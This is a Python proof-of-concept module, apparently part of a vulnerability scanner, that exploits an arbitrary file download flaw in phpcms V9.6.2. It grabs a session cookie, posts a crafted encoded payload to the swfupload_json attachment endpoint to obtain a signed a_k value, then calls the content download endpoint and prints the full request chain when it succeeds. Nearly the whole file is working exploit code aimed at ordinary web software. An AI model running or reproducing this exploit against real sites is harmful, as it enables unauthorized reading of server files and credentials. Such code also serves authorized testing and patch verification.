'''
Function:
    phpcmsV9.6.2_downfile
Author:
    spmonkey
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import re
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        self.payload = 'pad%3dx%26i%3d1%26modelid%3d1%26catid%3d1%26d%3d1%26m%3d1%26f%3d.p%25253chp%26s%3dapi%26pade%3d'
        self.value_list = []
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        cookie_url = "{}://{}/index.php?m=wap&c=index&a=init&siteid=1".format(scheme, netloc)
        try:
            result_cookie = requests.get(url=cookie_url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if result_cookie.status_code == 200:
                cookie_post = result_cookie.cookies.values()[0]
                vuln_url = "{}://{}/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src={}".format(scheme, netloc, self.payload)
                data = {
                    "userid_flash": cookie_post
                }
                vuln_result = requests.post(url=vuln_url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                if vuln_result.status_code == 200 and vuln_result.text == "":
                    vuln_cookie = re.search("json=(.*)", vuln_result.headers["Set-Cookie"]).group(1)
                    url = "{}://{}/index.php?m=content&c=down&a_k={}".format(scheme, netloc, vuln_cookie)
                    result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                    if 'class="xzs_btn"' in result.text:
                        target = urlparse(cookie_url)
                        self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件下载漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                        for request_type, request_text in dict(result_cookie.request.headers).items():
                            self.result_text += "\n                 {}: {}".format(request_type, request_text)
                        target = urlparse(vuln_url)
                        self.result_text += """\n\n                 POST {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                        for request_type, request_text in dict(vuln_result.request.headers).items():
                            self.result_text += "\n                 {}: {}".format(request_type, request_text)
                        for param, value in data.items():
                            values = param + "=" + value
                            self.value_list.append(values)
                        self.result_text += "\n\n                 {}".format("&".join(self.value_list))
                        target = urlparse(url)
                        self.result_text += """\n\n                 GET {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                        for request_type, request_text in dict(result.request.headers).items():
                            self.result_text += "\n                 {}: {}".format(request_type, request_text)
                        return True
                    else:
                        return False
                else:
                    return False
            else:
                return False
        except Exception as e:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False

